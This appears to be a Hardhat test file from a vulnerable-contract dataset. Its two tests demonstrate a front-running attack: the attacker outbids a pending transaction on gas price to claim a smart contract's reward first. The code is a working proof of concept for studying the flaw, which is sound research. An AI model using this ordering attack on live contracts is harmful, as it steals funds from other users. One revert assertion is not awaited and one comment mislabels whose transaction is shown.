const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe('attack front_running/eth_tx_order_dependence_minimal.sol', function () {
    let owner, user , attacker;
    async function deployContracts() {
      [owner, user, attacker] = await ethers.getSigners();
      const EthTxOrderDependenceMinimal = await ethers.getContractFactory('contracts/dataset/front_running/eth_tx_order_dependence_minimal.sol:EthTxOrderDependenceMinimal');
      const victim = await EthTxOrderDependenceMinimal.connect(owner).deploy();  
      return {victim};
    }


    it('front running control vulnerability in setReward() function', async function () {
      const {victim} = await loadFixture(deployContracts);

      const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);
      
      expect(await victim.owner()).to.be.equal(owner.address);

      const initialBalance = await ethers.provider.getBalance(victim.target);
      expect(initialBalance).to.be.equal(0);


      await victim.connect(owner).setReward({value: 2});
      const balanceReward = await ethers.provider.getBalance(victim.target);
      expect(balanceReward).to.be.equal(2);

      await network.provider.send("evm_setAutomine", [false]);
      await network.provider.send("evm_setIntervalMining", [0]);
      //owner wants to rectify the reward
      const tx1 = await victim.connect(owner).setReward({value: 1, gasPrice: 767532034});

      // attacker sees tx1 and wants to claim the reward before it's reset
      const tx2 = await victim.connect(attacker).claimReward(1, {gasPrice: 767533000});

      await network.provider.send("evm_mine");
      await network.provider.send("evm_setAutomine", [true]);

      // owner's tx1 will be reverted since the attacker's tx2 was mined first
      expect(tx1).to.be.reverted;
      const receipt2 = await (await tx2).wait();
      const gasUsed = receipt2.gasUsed * BigInt(767533000);
      const balanceAfter = await ethers.provider.getBalance(victim.target);
      expect(balanceAfter).to.be.equal(0);

      const attackerBalance = await ethers.provider.getBalance(attacker.address);
      expect(attackerBalance).to.be.equal(attackerBalanceBefore + balanceReward - gasUsed);
    });


    it('front running control vulnerability in claimReward() function', async function () {
        const {victim} = await loadFixture(deployContracts);
  
        const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);
        
        expect(await victim.owner()).to.be.equal(owner.address);
  
        const initialBalance = await ethers.provider.getBalance(victim.target);
        expect(initialBalance).to.be.equal(0);
  
  
        await victim.connect(owner).setReward({value: 2});
        const balanceReward = await ethers.provider.getBalance(victim.target);
        expect(balanceReward).to.be.equal(2);
  
        await network.provider.send("evm_setAutomine", [false]);
        await network.provider.send("evm_setIntervalMining", [0]);
        //user knows that claimming reward with value 1 will be successfull
        const tx1 = await victim.connect(user).claimReward(1, {gasPrice: 767532034});
  
        // attacker sees tx1 with value 1 and wants to claim the reward before user
        const tx2 = await victim.connect(attacker).claimReward(1, {gasPrice: 767533000});
  
        await network.provider.send("evm_mine");

        await network.provider.send("evm_setAutomine", [true]);
  
        // owner's tx1 will be reverted since the attacker's tx2 was mined first
        expect(tx1).to.be.reverted;
        const receipt2 = await (await tx2).wait();
        const gasUsed = receipt2.gasUsed * BigInt(767533000);
        const balanceAfter = await ethers.provider.getBalance(victim.target);
        expect(balanceAfter).to.be.equal(0);
  
        const attackerBalance = await ethers.provider.getBalance(attacker.address);
        expect(attackerBalance).to.be.equal(attackerBalanceBefore + balanceReward - gasUsed);
  
      });


  });